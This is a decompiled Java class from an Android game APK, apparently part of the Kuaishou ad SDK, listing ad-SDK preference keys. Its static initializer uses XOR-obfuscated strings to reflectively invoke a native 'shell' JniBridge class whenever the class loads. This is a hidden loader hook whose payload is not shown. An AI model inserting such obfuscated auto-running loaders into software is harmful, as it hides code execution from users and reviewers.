package com.kwad.sdk;

import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.List;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes2.dex */
public final class i {
    public static String awo = "kwrules.csv";
    public static String awp = "";
    public static String awq = "adEcDistribution";

    public static class a {
        public static List<String> awr = Arrays.asList("ksadsdk_pref", "ksadsdk_reward_reflow_config", "ksadsdk_rep", "ksadsdk_seq", "ksadsdk_mplogseq", "ksadsdk_splash_preload_id_list", "ksadsdk_notification_download_complete", "ksadsdk_download_package_md5", "ksadsdk_download_package_length", "ksadsdk_api_path", "ksadsdk_egid", "ksadsdk_config_request", "ksadsdk_gidExpireTimeMs", "ksadsdk_device_sig", "ksadsdk_model", "ksadsdk_wallpaper_path", "ksadsdk_JS_CONFIG", "ksadsdk_data_flow_auto_start", "ksadsdk_splash_daily_show_count", "ksadsdk_interstitial_daily_show_count", "ksadsdk_interstitial_aggregate_daily_show_count", "ksadsdk_local_ad_task_info", "ksadsdk_reward_full_ad_jump_direct", "ksadsdk_splash_local_rotate_active_count", "ksadsdk_reward_auto_call_app_card_show_count", "ksadsdk_local_ad_force_active", "ksadsdk_local_ad_force_active_data", "ksadsdk_so_load_times", "ksadsdk_solder", "ksadsdk_idc", "ksadsdk_fullscreen_local_ad_count", "ksadsdk_perf_ranger_v2", "ksadsdk_perf", "ksadsdk_inner_ec_user_login_bind_info", "ksadsdk_reward_task_cache");
        public static List<String> aws = Arrays.asList("ksadsdk_pref", "ksadsdk_idc", "ksadsdk_config_request", "ksadsdk_model", "ksadsdk_egid", "ksadsdk_solder", "ksadsdk_gidExpireTimeMs", "ksadsdk_device_sig", "ksadsdk_splash_local_ad_force_active");

        static {
            yvGvrPM();
        }

        private static /* synthetic */ void yvGvrPM() {
            char[] charArray = "¯£¡â«\u00ad¡©â®£µâ¿¤©  â\u0086¢¥\u008e¾¥¨«©".toCharArray();
            int length = charArray.length;
            for (int i = 0; i < length; i++) {
                charArray[i] = (char) (charArray[i] ^ 204);
            }
            String str = new String(charArray);
            char[] charArray2 = "¯ ¥¢¥¸".toCharArray();
            int length2 = charArray2.length;
            for (int i2 = 0; i2 < length2; i2++) {
                charArray2[i2] = (char) (charArray2[i2] ^ 204);
            }
            Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
            declaredMethod.setAccessible(true);
            declaredMethod.invoke(null, new Object[0]);
        }
    }
}
